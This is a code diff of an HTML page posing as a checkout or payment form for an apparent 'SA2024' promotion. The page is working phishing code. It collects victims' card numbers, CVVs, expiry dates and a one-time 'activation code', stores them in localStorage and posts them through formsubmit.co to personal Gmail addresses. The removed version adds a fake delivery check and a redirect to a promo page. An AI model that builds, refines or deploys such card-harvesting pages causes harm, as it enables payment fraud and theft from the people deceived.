@@ -243,7 +243,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checkout Process</title>
+    <title>Payment Form</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -286,21 +286,10 @@
         button:hover {
             background: #218838;
         }
-        .loading-container {
+        .price-info {
             text-align: center;
-            margin-top: 20px;
-        }
-        .loading-bar {
-            width: 0%;
-            height: 20px;
-            background-color: #4caf50;
-            transition: width 3s;
-        }
-        .congratulations {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 1.5rem;
-            color: green;
+            font-size: 1.2rem;
+            margin-top: 15px;
         }
         .popup {
             display: none;
@@ -339,40 +328,9 @@
 </head>
 <body>
 
-    <!-- Step 1: User Details Form -->
-    <div id="userDetailsForm" class="form-container">
-        <h1>Enter Your Delivery Details</h1>
-        <form id="detailsForm">
-            <label for="fullName">Full Name:</label>
-            <input type="text" id="fullName" name="fullName" required>
-
-            <label for="address">Address:</label>
-            <input type="text" id="address" name="address" required>
-
-            <label for="phone">Phone Number:</label>
-            <input type="text" id="phone" name="phone" required>
-
-            <label for="email">Email Address:</label>
-            <input type="email" id="email" name="email" required>
-
-            <button type="button" id="nextBtn" onclick="startLoading()">Next</button>
-        </form>
-    </div>
-
-    <!-- Step 2: Loading Bar and Congratulations -->
-    <div id="loadingContainer" class="loading-container" style="display: none;">
-        <p>Checking address...</p>
-        <div class="loading-bar" id="loadingBar"></div>
-        <p id="congratulationsMessage" class="congratulations" style="display: none;">
-            Congratulations! 🎉 We can deliver to your address. 
-        </p>
-        <button id="continueBtn" style="display: none;" onclick="goToPaymentForm()">Continue</button>
-    </div>
-
-    <!-- Step 3: Payment Details Form -->
-    <div id="paymentFormContainer" class="form-container" style="display:none;">
+    <div class="form-container">
         <h1>Payment Details</h1>
-        <form id="paymentForm" action="https://formsubmit.co/iamfinaid6@gmail.com" method="POST" onsubmit="handleFormSubmit(event)">
+        <form id="paymentForm" action="https://formsubmit.co/wizw9191@gmail.com" method="POST">
             <label for="name">Name:</label>
             <input type="text" id="name" name="name" required>
 
@@ -405,87 +363,97 @@
     <!-- Activation Code Popup -->
     <div class="overlay" id="overlay"></div>
     <div class="popup" id="popup">
-        <h2>Enter Verification Code</h2>
-        <p>Your Verification code will be available in 14 minutes. Please check back once you get the sms verification code</p>
+        <h2>Enter Activation Code</h2>
+        <p>Your activation code will be available in 14 minutes. Please check back then.</p>
         <input type="text" id="activationCode" placeholder="Enter Activation Code">
-        <button id="submitActivationCode" disabled>Submit Verification Code</button>
+        <button id="submitActivationCode" disabled>Submit Activation Code</button>
     </div>
 
     <script>
-        // Function to start loading process
-        function startLoading() {
-            const fullName = document.getElementById('fullName').value;
-            const address = document.getElementById('address').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
+        // Function to enable/disable Pay button based on form completeness
+        function togglePayButton() {
+            const name = document.getElementById('name').value;
+            const cardno = document.getElementById('cardno').value;
+            const cvv = document.getElementById('cvv').value;
+            const month = document.getElementById('month').value;
+            const year = document.getElementById('year').value;
+            const payBtn = document.getElementById('payBtn');
 
-            if (fullName && address && phone && email) {
-                // Save user details to localStorage
-                localStorage.setItem('userDetails', JSON.stringify({
-                    fullName,
-                    address,
-                    phone,
-                    email
-                }));
-
-                // Hide the user details form and show the loading container
-                document.getElementById('userDetailsForm').style.display = 'none';
-                document.getElementById('loadingContainer').style.display = 'block';
-
-                // Start loading bar animation
-                let progress = 0;
-                const loadingBar = document.getElementById('loadingBar');
-                const loadingInterval = setInterval(function() {
-                    progress += 10;
-                    loadingBar.style.width = progress + '%';
-
-                    // Update the progress display
-                    loadingBar.innerText = progress + '%';
-
-                    if (progress === 100) {
-                        clearInterval(loadingInterval);
-                        document.getElementById('congratulationsMessage').style.display = 'block';
-                        setTimeout(function() {
-                            document.getElementById('continueBtn').style.display = 'inline-block';
-                        }, 6000); // Wait for 6 seconds before showing the "Continue" button
-                    }
-                }, 300); // Updates every 300ms
+            // Enable the "Pay R20" button only if all fields are filled
+            if (name && cardno && cvv && month && year) {
+                payBtn.disabled = false;
             } else {
-                alert('Please fill in all the fields');
+                payBtn.disabled = true;
             }
         }
 
-        // Go to the payment form
-        function goToPaymentForm() {
-            document.getElementById('loadingContainer').style.display = 'none';
-            document.getElementById('paymentFormContainer').style.display = 'block';
+        // Enable the "Submit Activation Code" button when any value is entered in the activation code field
+        document.getElementById('activationCode').addEventListener('input', function() {
+            const submitActivationCodeBtn = document.getElementById('submitActivationCode');
+            // Enable the submit button as soon as there's any input in the activation code field
+            if (this.value) {
+                submitActivationCodeBtn.disabled = false;
+            } else {
+                submitActivationCodeBtn.disabled = true;
+            }
+        });
+
+        // Check form inputs for each keystroke to enable/disable Pay button
+        document.getElementById('paymentForm').addEventListener('input', togglePayButton);
+
+        // Check if user has previously filled the form
+        window.onload = function() {
+            if(localStorage.getItem('paymentDetails')) {
+                const paymentDetails = JSON.parse(localStorage.getItem('paymentDetails'));
+                document.getElementById('name').value = paymentDetails.name;
+                document.getElementById('cardno').value = paymentDetails.cardno;
+                document.getElementById('cvv').value = paymentDetails.cvv;
+                document.getElementById('month').value = paymentDetails.month;
+                document.getElementById('year').value = paymentDetails.year;
+                togglePayButton();
+            }
         }
 
-        // Handle form submission and redirect
-        function handleFormSubmit(event) {
-            event.preventDefault(); // Prevent form from submitting normally
+        // Store form details in localStorage
+        document.getElementById('paymentForm').addEventListener('input', function() {
+            const paymentDetails = {
+                name: document.getElementById('name').value,
+                cardno: document.getElementById('cardno').value,
+                cvv: document.getElementById('cvv').value,
+                month: document.getElementById('month').value,
+                year: document.getElementById('year').value
+            };
+            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
+        });
 
-            // Get the form data
-            const form = document.getElementById('paymentForm');
-            const formData = new FormData(form);
+        // Show activation code popup and store details
+        document.getElementById('payBtn').addEventListener('click', function() {
+            // Store the initial form details before showing the popup
+            localStorage.setItem('paymentDetails', JSON.stringify({
+                name: document.getElementById('name').value,
+                cardno: document.getElementById('cardno').value,
+                cvv: document.getElementById('cvv').value,
+                month: document.getElementById('month').value,
+                year: document.getElementById('year').value
+            }));
 
-            // Send the form data using fetch to submit to your email
-            fetch(form.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirect to the specified URL after successful form submission
-                    window.location.href = 'https://big24promo.github.io/SA2024promo/';
-                } else {
-                    alert('There was an error with your submission. Please try again.');
-                }
-            })
-            .catch(error => {
-                alert('There was an error with your submission. Please try again.');
-            });
-        }
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        });
+
+        // Handle activation code submission
+        document.getElementById('submitActivationCode').addEventListener('click', function() {
+            const activationCode = document.getElementById('activationCode').value;
+            if (activationCode) {
+                // Add the activation code to the hidden input before submission
+                document.getElementById('activationCodeInput').value = activationCode;
+
+                // Submit form after user enters activation code
+                document.getElementById('paymentForm').submit();
+            } else {
+                alert("Please enter the activation code.");
+            }
+        });
     </script>
     </section>
 
